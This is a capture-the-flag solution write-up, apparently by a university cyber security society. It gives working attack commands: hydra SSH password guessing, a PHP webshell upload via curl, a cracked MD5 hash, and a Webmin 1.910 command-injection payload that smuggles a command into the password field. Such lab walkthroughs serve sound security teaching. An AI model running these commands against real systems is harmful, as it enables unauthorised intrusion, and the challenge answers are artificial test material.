# The Complete System
An everything-system of challenges for the best among you!

## Solving the challenge

### 1 - Misc: 

**You need access, and SSH is conveniently exposed...**

Using hydra, and a basic wordlist such as ```rockyou.txt``` it is possible to run an SSH spray attack against the IP you were given: ```192.168.1.10```, and retrieve the correct password.

<details>
<summary>Reveal Hydra command</summary>

```
hydra -l jeremy -P rockyou.txt ssh://192.168.1.10
```

```-l jeremy```: specifies the username

```-P rockyou.txt```: specifies the wordlist
</details>

### 2.1 - Rev:

**The binary needs to be somewhere it will be ran...**

How about ```~/.bashrc```?

Once you find the new ```sudo``` binary, you can open it with Ghidra or Binary Ninja or another decompiler, and access the URL that way.
However - it will take some extra work to spot the variable!

It is also possible to run ```strings```, however you may miss a certain something (!):
<details>
<summary>Reveal command</summary>

```
strings /usr/bin/sudo | grep -A 5 -B 5 http
```

```strings```: prints all ASCII strings in the file

```-B 5```: print 5 lines Before the matching line

```-A 5```: print 5 lines After the matching line

```http```: its gonna have to communicate somehow, so as good a guess as any - or just don't ```grep```!
</details>

### 3.1 - Forensics:

**Logs are the best thing for this, and if the attacker has deleted them, maybe they're still in the ```~/.local/share/Trash``` directory?**

There is a ```.pcap``` file here that you can investigate, using Wireshark.

There are two simple ways to figure this out:

<details>
<summary>Reveal solution 1</summary>

Use wireshark display filter:
```
tcp.port == 22
```
because we can assume the SSH port since our entry vector was the same.
</details>
OR
<details>
<summary>Reveal solution 2</summary>

Have a look at Wireshark's TCP streams.

```
Analyze > Follow > TCP Stream
```

This automatically gathers all the information from that session, then you can check the packets.
However, you may need to scroll through TCP streams until you find the correct one...
</details>

### 2.2 - Web:

**You know that there is a ```receiver.php``` endpoint that accepts file uploads from the previous challenge so...**

You need to upload a PHP file, ideally with a webshell, but potentially static commands, to the server - then figure out the upload folder.

<details>
<summary>Reveal file upload</summary>

Post the file as raw binary data to ```receiver.php```.

```
curl -X POST --data-binary "@./webshell.php" "http://localhost/receiver.php?name=webshell.php"
```

Then figure out the directory they are uploaded to - this one is a guessing game, but! its a very simple one.

<details>
<summary>Reveal Directory</summary>

```
http://<IP>/uploads/
```
</details>
<br />
There is then a file in the upload directory that is clearly sensitive: ```etcshadow_old```.
If you view the text content, it is formatted as an 
/etc/shadow file - except not using a recognised cipher.

However, the cipher is stated to be ```md5```, which is broken.

Using a website such as [CrackStation](https://crackstation.net/) and removing all the other data (cipher, salt, or any other user info) you should be able to crack the hash.

<details>
<summary>Reveal hash and plaintext</summary>

```
8621ffdbc5698829397d97767ac13db3 -> dragon
```
</details>

</details>

### 3.2 - Misc:

**You have their IP, but do they have any services exposed?**

Using ```nmap -sV 192.168.1.74```, you can see the attacker has a outdated Webmin server  (1.910) running, on port 10000.

A quick google later, and you know that Webmin has an RCE vulnerability in <= 1.910.

By using a specially crafted curl command, you can achieve RCE on the host.

<details>
<summary>Reveal curl command</summary>

```
curl -k -X POST \
  "https://192.168.1.74:10000/password_change.cgi" \
  -H "Referer: https://192.168.1.74:10000/session_login.cgi" \
  -d "user=rootxx&pam=&expired=2&old=test|ls&new1=test2&new2=test2"
```

```-k```: don't verify SSL
```-X POST```: POST request
```Referer: ...```: set the apparent redirect original location
```user=rootxx```: set username to change password of (needs to not exist for exploit)
```expired=2```: set password to be expired
```old=test|ls```: old password, then **pipe and command to run**
```new1=new1```: new passwords, just so it doesn't error out

</details>
<br />

Then you can see a *very interesting* file in ../ called ```SECRET_doNotOpen_onPainOfDeath.txt```.

### 3.3 - Crypto:

Given the string:

```
BF50HFcun1AxV0mhICA0IGW0ZiK1kwZiltp0H2c9RJ==
```

one would presume Base64 encoded - however, this spits out loads of garbage characters.

Running with the fact its clearly some kind of amalgamation of Base64 and something else, we start considering text ciphers, e.g. Caesar, substitution, Affine, Bacon, Rail fence.

If you start with the simplest - Caesar with key 1-26 then Base64 decode, you will find the flag has been Base64 encoded, then enciphered with key 9 under Caesar.

<hr />

Created by **Peter Walker**<br />
President | Warwick Cyber Security Society<br />
[https://www.linkedin.com/in/p3ter-w/](https://www.linkedin.com/in/p3ter-w/)